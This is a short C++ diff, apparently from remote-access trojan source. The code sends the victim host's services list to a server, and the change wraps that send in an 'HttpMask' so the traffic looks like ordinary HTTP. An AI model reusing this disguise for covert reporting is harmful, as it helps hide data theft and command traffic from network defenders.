@@ -25,8 +25,8 @@ VOID CServicesManager::SendServicesList()
 	LPBYTE	szBuffer = GetServicesList();
 	if (szBuffer == NULL)
 		return;	
-
-	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer), &mask);
 	LocalFree(szBuffer);
 }
 
